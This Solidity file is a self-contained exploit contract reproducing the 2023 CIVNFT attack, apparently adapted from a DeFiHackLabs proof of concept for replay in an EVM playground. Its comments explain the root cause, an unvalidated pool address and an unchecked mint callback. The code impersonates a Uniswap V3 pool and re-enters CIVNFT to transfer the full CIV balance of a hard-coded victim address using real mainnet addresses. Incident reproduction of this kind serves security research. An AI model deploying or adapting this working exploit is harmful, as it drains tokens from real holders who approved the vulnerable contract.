// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-07-CIVNFT).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (CIVNFTTest impersonates a fake Uniswap V3 pool by implementing token0/token1/
// tickSpacing/slot0/mint itself, and attacker = address(this)), so there is no
// standalone attack contract to deploy. This is a faithful, self-contained copy
// of that inline attack (testExploit -> call0x7ca06d68 -> CIVNFT re-enters this
// contract as the "pool" -> mint() -> callUniswapV3MintCallback) compiled into
// the registry forge project so the playground can deploy it and record run().
// Logic and constants are copied verbatim from test/CIVNFT_exp.sol.
//
// Root cause (CIVNFT impl 0x78bd317a87d2Eab65b666e9402182A949Ab4EeB9, delegatecalled
// through the proxy at 0xF169BD68ED72B2fdC3C9234833197171AA000580):
//   1. The public entrypoint (selector 0x7ca06d68) accepts an arbitrary "pool"
//      address argument and never validates it against the canonical Uniswap V3
//      factory -- the caller can point it at their own contract.
//   2. uniswapV3MintCallback (selector 0xd3487997) trusts whatever address it is
//      told to pull tokens FROM in the callback `data`, and never checks that
//      msg.sender is a genuine Uniswap V3 pool. Because the (fake) pool controls
//      both `data` and the callback invocation, it can name ANY approved account
//      as the payer and have CIVNFT call CIV.transferFrom(payer, pool, amount).
// Composed: anyone can drain any account that ever approved CIVNFT for CIV.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract CIVNFTDrain {
    struct Slot0 {
        uint160 sqrtPriceX96;
        int24 tick;
        uint16 observationIndex;
        uint16 observationCardinality;
        uint16 observationCardinalityNext;
        uint8 feeProtocol;
        bool unlocked;
    }

    IERC20 private constant CIV = IERC20(0x37fE0f067FA808fFBDd12891C0858532CFE7361d);
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant CIVNFT = 0xF169BD68ED72B2fdC3C9234833197171AA000580;
    address private constant VICTIM = 0x512e9701D314b365921BcB3b8265658A152C9fFD;

    // entrypoint recorded by the playground -- mirrors testExploit()
    function run() external {
        // Calling vulnerable function in CIVNFT contract
        call0x7ca06d68();
    }

    // --- fake Uniswap V3 pool stubs (this contract IS the "pool") --------------

    function token0() external pure returns (address) {
        return address(CIV);
    }

    function token1() external pure returns (address) {
        return WETH;
    }

    function tickSpacing() external pure returns (int24) {
        return 60;
    }

    function slot0() external pure returns (Slot0 memory) {
        return Slot0({
            sqrtPriceX96: 590_212_530_842_204_246_875_907_781,
            tick: -97_380,
            observationIndex: 0,
            observationCardinality: 1,
            observationCardinalityNext: 1,
            feeProtocol: 0,
            unlocked: true
        });
    }

    // Uniswap V3 pool.mint() re-entrypoint: CIVNFT calls this on the "pool" it
    // was told to use. The fake pool simply re-enters CIVNFT's mint callback.
    function mint(address recipient, int24 tickLower, int24 tickUpper, uint128 amount, bytes calldata data)
        external
        returns (uint256 amount0, uint256 amount1)
    {
        callUniswapV3MintCallback();
    }

    // --- the two calls that make up the exploit ---------------------------------

    function call0x7ca06d68() internal {
        (bool success,) = CIVNFT.call(
            abi.encodeWithSelector(
                bytes4(0x7ca06d68), // vulnerable function selector
                address(this), // fake uniswap pool (this contract)
                abi.encodePacked("0.000059"),
                -97_385, // int24 tick
                195_476_868_337_608_980_000_000, // uint256 liquidity
                0, // uint256
                true // bool
            )
        );
        require(success, "Call to CIVNFT failed");
    }

    function callUniswapV3MintCallback() internal {
        // payer = VICTIM, recipient = VICTIM (recipient is unused by CIVNFT's
        // callback -- only `payer`, decoded first, is ever used to pull funds)
        bytes memory data = abi.encode(VICTIM, VICTIM);
        (bool success,) =
            CIVNFT.call(abi.encodeWithSelector(bytes4(0xd3487997), CIV.balanceOf(VICTIM), 0, data));
        require(success, "Call to Uniswap callback failed");
    }
}
